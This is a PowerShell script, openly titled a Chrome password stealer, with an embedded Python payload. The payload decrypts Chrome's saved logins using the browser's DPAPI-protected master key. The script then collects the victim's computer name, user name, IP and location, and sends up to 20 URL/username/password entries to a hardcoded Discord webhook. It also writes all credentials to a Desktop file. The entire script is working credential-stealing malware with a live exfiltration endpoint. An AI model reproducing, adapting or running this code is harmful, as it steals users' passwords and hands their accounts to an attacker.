# Chrome Password Stealer - Complete Version

Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
Write-Host ""

# Kill Chrome processes
Write-Host "Stopping Chrome processes..." -ForegroundColor Yellow
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Create Python script
$pythonScript = @'
import sys, json, base64, sqlite3, shutil, os, traceback
from Crypto.Cipher import AES
import win32crypt

def log(msg):
    """Write to stderr for debugging"""
    sys.stderr.write(f"{msg}\n")
    sys.stderr.flush()

try:
    log("=== Starting extraction ===")
    
    # Get encryption key
    local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    log(f"Reading: {local_state}")
    
    with open(local_state, "r", encoding="utf-8") as f:
        state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    log(f"Master key extracted: {len(key)} bytes")
    
    # Copy database
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_db = os.path.join(os.environ["TEMP"], "chrome_{}.db".format(os.getpid()))
    
    log(f"Copying DB from: {db_path}")
    log(f"Copying DB to: {temp_db}")
    
    try:
        shutil.copyfile(db_path, temp_db)
        log("DB copied successfully")
    except Exception as copy_err:
        log(f"Copy failed: {copy_err}")
        import time
        time.sleep(1)
        shutil.copyfile(db_path, temp_db)
    
    # Extract passwords
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
    
    all_rows = cursor.fetchall()
    log(f"Total rows fetched: {len(all_rows)}")
    
    results = []
    success_count = 0
    fail_count = 0
    
    for url, username, enc_pass in all_rows:
        if not enc_pass or not username:
            continue
        
        try:
            # Detect encryption version
            if enc_pass[:3] == b'v10':
                log(f"Processing (v10): {url}")
                nonce = enc_pass[3:15]
                ciphertext = enc_pass[15:-16]
                tag = enc_pass[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                
            elif enc_pass[:3] == b'v20':
                log(f"Processing (v20): {url}")
                nonce = enc_pass[3:15]
                ciphertext = enc_pass[15:-16]
                tag = enc_pass[-16:]
                
                log(f"  Nonce: {len(nonce)} bytes, Cipher: {len(ciphertext)} bytes, Tag: {len(tag)} bytes")
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                
            else:
                log(f"Processing (DPAPI): {url}")
                password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8')
            
            if password and password.strip():
                results.append({"url": url, "username": username, "password": password})
                success_count += 1
                log(f"  SUCCESS")
            else:
                log(f"  Empty password")
                fail_count += 1
                
        except Exception as decrypt_err:
            log(f"  FAILED: {decrypt_err}")
            fail_count += 1
    
    cursor.close()
    conn.close()
    
    try:
        os.remove(temp_db)
        log("Temp DB removed")
    except:
        pass
    
    log(f"=== Extraction complete: {success_count} success, {fail_count} failed ===")
    
    print(json.dumps(results))
    
except Exception as e:
    log(f"FATAL ERROR: {str(e)}")
    log(traceback.format_exc())
    print(json.dumps({"error": str(e)}))
'@

$scriptPath = "$env:TEMP\extract.py"
$pythonScript | Out-File $scriptPath -Encoding UTF8

Write-Host "Installing dependencies..." -ForegroundColor Yellow
python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null

Write-Host "Extracting passwords..." -ForegroundColor Yellow
$stderr = python $scriptPath 2>&1

# Separate JSON from debug logs
$jsonOutput = ""
$debugOutput = ""

foreach ($line in $stderr) {
    $lineStr = $line.ToString()
    if ($lineStr -match '^\[?\{.*\}?\]?$') {
        $jsonOutput += $lineStr
    } else {
        $debugOutput += "$lineStr`n"
    }
}

# Show debug output
Write-Host "`n=== DEBUG OUTPUT ===" -ForegroundColor Magenta
Write-Host $debugOutput -ForegroundColor Gray
Write-Host "===================`n" -ForegroundColor Magenta

# Parse JSON
try {
    if ([string]::IsNullOrWhiteSpace($jsonOutput)) {
        Write-Host "ERROR: No JSON output received!" -ForegroundColor Red
        Write-Host "Check debug output above for errors" -ForegroundColor Red
        Read-Host "Press Enter"
        exit
    }
    
    $passwords = $jsonOutput | ConvertFrom-Json
    
    if ($passwords.error) {
        Write-Host "Error: $($passwords.error)" -ForegroundColor Red
        Read-Host "Press Enter"
        exit
    }
    
    Write-Host "Found $($passwords.Count) passwords!" -ForegroundColor Green
    Write-Host ""
    
    if ($passwords.Count -eq 0) {
        Write-Host "No passwords extracted. Check debug output above." -ForegroundColor Yellow
        Read-Host "Press Enter"
        exit
    }
    
    # Get system info
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    Write-Host "Getting IP info..." -ForegroundColor Yellow
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -TimeoutSec 5
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    # Format for Discord (max 20 passwords)
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more passwords not shown"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords ($($passwords.Count)):**$passText
"@
    
    # Send to Discord
    Write-Host "Sending to Discord..." -ForegroundColor Yellow
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    # Discord has 2000 char limit
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900) + "`n... (truncated)"
    }
    
    try {
        $body = @{content=$message} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" | Out-Null
        Write-Host "Successfully sent to Discord!" -ForegroundColor Green
    } catch {
        Write-Host "Failed to send to Discord: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Save locally
    Write-Host "Saving to file..." -ForegroundColor Yellow
    $outFile = "$env:USERPROFILE\Desktop\passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    
    $outputContent = "Chrome Passwords - Extracted: $time`n"
    $outputContent += "Computer: $computer | User: $user`n"
    $outputContent += "IP: $ip - $city, $country`n"
    $outputContent += "="*50 + "`n`n"
    
    foreach ($p in $passwords) {
        $outputContent += "URL: $($p.url)`n"
        $outputContent += "Username: $($p.username)`n"
        $outputContent += "Password: $($p.password)`n"
        $outputContent += "-"*50 + "`n"
    }
    
    $outputContent | Out-File $outFile -Encoding UTF8
    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
    Write-Host ""
    
    # Display summary
    Write-Host "=== EXTRACTION COMPLETE ===" -ForegroundColor Green
    Write-Host "Total passwords: $($passwords.Count)" -ForegroundColor Green
    Write-Host "Sent to Discord: Yes" -ForegroundColor Green
    Write-Host "Saved locally: Yes" -ForegroundColor Green
    
} catch {
    Write-Host "Parse error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Raw output:" -ForegroundColor Yellow
    Write-Host $jsonOutput -ForegroundColor Gray
}

# Cleanup
Remove-Item $scriptPath -ErrorAction SilentlyContinue

Write-Host ""
Read-Host "Press Enter to exit"
